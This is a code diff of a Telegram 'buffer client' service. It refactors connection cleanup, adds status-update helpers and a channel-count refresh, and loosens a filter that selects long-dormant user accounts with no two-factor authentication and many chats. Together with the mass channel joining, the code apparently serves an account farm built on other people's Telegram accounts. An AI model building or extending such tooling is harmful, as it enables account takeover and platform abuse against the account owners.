@@ -52,7 +52,6 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
         this.logger.log('Cleaning up BufferClientService resources');
         this.clearBufferMap();
         this.clearLeaveMap();
-        await connection_manager_1.connectionManager.disconnectAll();
     }
     async create(bufferClient) {
         const newUser = new this.bufferClientModel({
@@ -145,18 +144,49 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
         this.joinChannelMap.clear();
         this.clearJoinChannelInterval();
     }
+    async updateStatus(mobile, status, message) {
+        const updateData = { status };
+        if (message) {
+            updateData.message = message;
+        }
+        return this.update(mobile, updateData);
+    }
+    async markAsInactive(mobile, reason) {
+        return this.updateStatus(mobile, 'inactive', reason);
+    }
+    async updateInfo() {
+        const clients = await this.bufferClientModel.find({
+            status: 'active'
+        }).sort({ channels: 1 });
+        for (const client of clients) {
+            const mobile = client.mobile;
+            try {
+                this.logger.debug(`Updating info for client: ${mobile}`);
+                const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
+                const channels = await telegramClient.channelInfo(true);
+                this.logger.debug(`${mobile}: Found ${channels.ids.length} existing channels`);
+                await this.update(mobile, { channels: channels.ids.length });
+                await connection_manager_1.connectionManager.unregisterClient(mobile);
+                await (0, Helpers_1.sleep)(2000);
+            }
+            catch (error) {
+                const errorDetails = (0, parseError_1.parseError)(error);
+                await this.markAsInactive(mobile, `${errorDetails.message}`);
+                this.logger.error(`Error updating info for client ${client.mobile}:`, errorDetails);
+            }
+        }
+    }
     async joinchannelForBufferClients(skipExisting = true) {
         if (this.telegramService.getActiveClientSetup()) {
             this.logger.warn('Ignored active check buffer channels as active client setup exists');
             return 'Active client setup exists, skipping buffer promotion';
         }
         this.logger.log('Starting join channel process for buffer clients');
-        await connection_manager_1.connectionManager.disconnectAll();
-        await (0, Helpers_1.sleep)(2000);
-        this.clearJoinChannelInterval();
-        this.clearLeaveChannelInterval();
         this.joinChannelMap.clear();
         this.leaveChannelMap.clear();
+        this.clearJoinChannelInterval();
+        this.clearLeaveChannelInterval();
+        await (0, Helpers_1.sleep)(2000);
         const existingKeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());
         const clients = await this.bufferClientModel.find({
             channels: { $lt: 350 },
@@ -283,7 +313,6 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                         const client = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
                         this.logger.debug(`${mobile} attempting to join channel: @${currentChannel.username}`);
                         await this.telegramService.tryJoiningChannel(mobile, currentChannel);
-                        await connection_manager_1.connectionManager.unregisterClient(mobile);
                     }
                     catch (error) {
                         const errorDetails = (0, parseError_1.parseError)(error, `${mobile} ${currentChannel ? `@${currentChannel.username}` : ''} Outer Err ERR: `, false);
@@ -303,12 +332,9 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                             this.removeFromBufferMap(mobile);
                             await this.remove(mobile);
                         }
-                        try {
-                            await connection_manager_1.connectionManager.unregisterClient(mobile);
-                        }
-                        catch (unregisterError) {
-                            this.logger.error(`Error unregistering client ${mobile}: ${unregisterError.message}`);
-                        }
+                    }
+                    finally {
+                        await connection_manager_1.connectionManager.unregisterClient(mobile);
                     }
                 }
             }
@@ -491,7 +517,6 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
             this.logger.warn("Ignored active check buffer channels as active client setup exists");
             return;
         }
-        await connection_manager_1.connectionManager.disconnectAll();
         await (0, Helpers_1.sleep)(2000);
         const bufferclients = await this.findAll('active');
         const badIds = [];
@@ -585,7 +610,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
             expired: false,
             twoFA: false,
             lastActive: { $lt: sixMonthsAgo },
-            totalChats: { $gt: 250 }
+            totalChats: { $gt: 150 }
         }, { tgId: 1 }, badIds.length + 3);
         this.logger.debug(`New buffer documents to be added: ${documents.length}`);
         while (badIds.length > 0 && documents.length > 0) {
@@ -629,7 +654,7 @@ let BufferClientService = BufferClientService_1 = class BufferClientService {
                         badIds.pop();
                     }
                     else {
-                        this.logger.warn("Failed to Update as BufferClient has Password");
+                        this.logger.debug(`Failed to Update as BufferClient as ${document.mobile} already has Password`);
                         await this.usersService.update(document.tgId, { twoFA: true });
                     }
                 }
